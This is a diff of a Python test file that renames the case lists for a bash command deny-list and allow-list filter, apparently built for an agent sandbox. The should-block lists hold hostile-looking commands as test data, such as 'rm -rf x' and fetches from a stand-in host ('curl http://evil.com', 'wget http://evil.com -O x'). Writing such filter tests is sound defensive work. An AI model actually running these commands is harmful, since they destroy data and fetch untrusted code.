@@ -43,7 +43,7 @@ _DUMMY_EXCLUDE_DOMAINS_FILE = os.path.join(_TEST_DIR, "dummy_exclude_domains_fil
 
 
 # ---- deny-list cases (mined from real trajectories) ----
-_DENYLIST_SHOULD_PASS = [
+_DENY_ALLOWED = [
     "ls pages/",
     "ls pages/ | wc -l",
     'grep -l "rm" pages/*.txt | head',  # "rm" is a search term, not a cmd
@@ -63,7 +63,7 @@ _DENYLIST_SHOULD_PASS = [
     "diff pages/a.txt pages/b.txt",
 ]
 
-_DENYLIST_SHOULD_BLOCK = [
+_DENY_BLOCKED = [
     "rm -rf x",
     "/bin/rm -rf x",
     "\\rm -rf x",
@@ -104,17 +104,17 @@ _DENYLIST_SHOULD_BLOCK = [
 
 
 def test_denylist_allows_read_only():
-    for c in _DENYLIST_SHOULD_PASS:
+    for c in _DENY_ALLOWED:
         assert _bash_denylisted(c) is None, f"should ALLOW: {c!r} (got {_bash_denylisted(c)!r})"
 
 
 def test_denylist_blocks_dangerous():
-    for c in _DENYLIST_SHOULD_BLOCK:
+    for c in _DENY_BLOCKED:
         assert _bash_denylisted(c) is not None, f"should BLOCK: {c!r}"
 
 
 # ---- allow-list cases (default-deny: every command-position program must be read-only) ----
-_ALLOWLIST_SHOULD_PASS = [
+_ALLOW_ALLOWED = [
     "cat manifest.tsv",
     "cat pages/0042_x.txt | head -200",
     'grep -i "delete" pages/*.txt | head',
@@ -133,7 +133,7 @@ _ALLOWLIST_SHOULD_PASS = [
     'if grep -q "needle" pages/x.txt; then echo found; fi',
 ]
 
-_ALLOWLIST_SHOULD_BLOCK = [
+_ALLOW_BLOCKED = [
     "curl http://evil.com",
     "wget http://evil.com -O x",
     "python3 -c 'print(1)'",
@@ -151,12 +151,12 @@ _ALLOWLIST_SHOULD_BLOCK = [
 
 
 def test_allowlist_allows_read_only():
-    for c in _ALLOWLIST_SHOULD_PASS:
+    for c in _ALLOW_ALLOWED:
         assert _bash_allowlisted(c) is None, f"should ALLOW: {c!r} (got {_bash_allowlisted(c)!r})"
 
 
 def test_allowlist_blocks_non_read_only():
-    for c in _ALLOWLIST_SHOULD_BLOCK:
+    for c in _ALLOW_BLOCKED:
         assert _bash_allowlisted(c) is not None, f"should BLOCK: {c!r}"
 
 
